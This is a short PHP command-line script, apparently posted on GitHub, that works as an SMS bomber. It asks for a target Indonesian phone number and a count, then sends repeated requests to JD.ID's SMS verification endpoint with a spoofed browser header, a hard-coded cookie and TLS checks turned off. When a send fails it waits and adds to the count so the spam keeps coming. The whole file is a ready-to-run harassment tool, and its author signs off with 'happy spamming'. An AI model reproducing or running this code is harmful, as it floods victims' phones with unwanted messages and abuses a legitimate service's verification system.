# Recode Modar!1!1!11!

<?php

//new spam by valdo taroreh

//just beginner

//happy spamming:)

echo "\e[93mSPAM SMS JD.ID

\e[91m#########################

\e[91mCODED BY VALDO TAROREH

Github : https://github.com/valdot

\e[36m#########################";

echo "\n\e[36mTarget 08xxxxxxx : ";

$no = trim(fgets(STDIN, 1024));

echo "Jumlah : ";

$loop = trim(fgets(STDIN, 1024));

echo "\e[36m===========\e[91m>>>>>>>>>>\n\e[96m\e[5mhasilnya:\n";

for ($x=1; $x<=$loop; $x++) {

	$c = curl_init();

	curl_setopt($c, CURLOPT_URL, "https://passport.jd.id/sms/sendSMSCode");

	curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0");

	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);

	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);

	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);

	curl_setopt($c, CURLOPT_HTTPHEADER, array(

	 'Accept: application/json, text/javascript, */*; q=0.01',

	 'Accept-Language: en-US,en;q=0.5',

	 'Content-Type: application/x-www-form-urlencoded; charset=utf-8',

	 'Connection: keep-alive',

	 'Host: passport.jd.id',

	 'Cookie: __jda=161319996.15195775008192065165156.1519577501.1519892386.1523711222.3',

	 'Referer: https://passport.jd.id/register/phone',

	 'X-Requested-With: XMLHttpRequest'

	));

	curl_setopt($c, CURLOPT_POSTFIELDS,"phone=".$no);

	curl_setopt($c, CURLOPT_POST, 1);

	$hasil = curl_exec($c);

	if ($hasil == "true") {

		echo "\e[92m$x. SPAM TELAH MELUNCUR........\n";

		flush();

		sleep(1);

	} else {

		$loop += 1;

		echo "\e[91m$x. SPAMNYA GAGAL BUDJANK.......\n\e[97mCount +1\n".($loop-$x)." remaining\n\e[93mSleep in 60s\n";

		flush();

		sleep(60);

	}

}

echo "\e[91mFB: Valdo Taroreh\n";

?>

